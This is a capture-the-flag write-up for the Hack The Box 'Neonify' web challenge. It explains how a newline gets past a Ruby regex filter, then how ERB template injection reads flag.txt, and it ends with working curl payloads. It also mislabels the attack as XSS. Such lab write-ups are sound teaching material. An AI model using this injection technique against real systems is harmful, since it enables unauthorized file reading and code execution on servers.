#writeup 
[**Neonify**](https://app.hackthebox.com/challenges/neonify) is an *easy* challenge on HTB.

We are supplied with two things:
- The IP-address and port number of a remote docker container running a website
- The files to run this docker file locally

Looking at the remote website we can see that it is quite simple. The most important aspect of it is an input box. Any text that is written in here is shown on the webpage in a neonified style. 

The docker container gives us access to all the source files of the website and tells us that there is a file in the directory called `flag.txt`. The local `flag.txt` is just a test instance, but we can assume that the real flag is located in the same file on the remote website.

Looking at the source code of the website, we see the following:
```html
# file: index.erb
<h1 class="title">Amazing Neonify Generator</h1>
<form action="/" method="post">
	<p>Enter Text to Neonify</p><br>
	<input type="text" name="neon" value="">
	<input type="submit" value="Submit">
</form>
<h1 class="glow"><%= @neon %></h1>
```
It tells us that the input that a user supplies is directly used as an html element with `class="glow"` in the website. This means that we might be able to perform some DOM-based XSS: supply the input form with a crafted string that prints the contents of the `flag.txt` form.

However, we quickly notice that whenever we enter any special characters as input, the resulting neon code just states "Malicious Input Detected". It seems some input sanitization is being performed. Let's take a look at the source code to see how this is implemented exactly:
```ruby
# file: neon.rb
post '/' do
    if params[:neon] =~ /^[0-9a-z ]+$/i
      @neon = ERB.new(params[:neon]).result(binding)
    else
      @neon = "Malicious Input Detected"
    end
    erb :'index'
  end
```

So, only if the input is matched by the regular expression `^[0-9a-z ]+$`, it is handled as expected. If there is no match, we get the "Malicious Input Detected" response. The regular expression `^[0-9a-z ]+$` is composed of:
- `^` beginning of a line
- `[0-9a-z ]+` on ore more of the charactes '0' through '9', 'a' through 'z' or a `space`.
- `$` the end of a line

We want to try to craft a string such that it matches this regular expression but still contains special characters. We can use an online [RE interpreter](https://regex101.com/) to play around with different strings. The crucial point here, is that the code is implemented such that the input string needs *some* match with the regular expression, but the match does not have to contain the entire input string. Thus, we find out that the string: "a\n ./<>" is matched on the "a\n" part, because of the newline!

The webapp in the browser actually makes it difficult to put newlines in the input field, because an Enter press just POSTs the request and '\n' is not interpreted. To circumvent this problem we can use `curl` and encode the string with url-encoding

```zsh
curl ip:port --data $'neon=test%0A<><><>'
```
We see that indeed, the response contains:
```html
        </form>
        <h1 class="glow">test
 <><><><</h1>
    </div>
```
There is no more sign of the "Malicious Input Detected" warning. Great, now that we now how to circumvent the input sanitization, let's craft an input that will read the contents of the `flag.txt` file.

In embedded ruby, which this application uses (we can see that by the `.erb` file-extenions) we can execute code using `<%= %>` element. Reading a file in Ruby can be done with `File.read('path/to/your/file.txt')`. So our final payload becomes:
```
test\n
<%= File.read('flag.txt') %>
```

Again, we need to encode the '\n' as well as the other characters, so that it is properly parsed. So finally, we run the command:
```zsh
curl ip:port --data 'neon=test%0A%3C%25%3D%20File.read%28%27flag.txt%27%29%20%25%3E'
```

And we get the flag!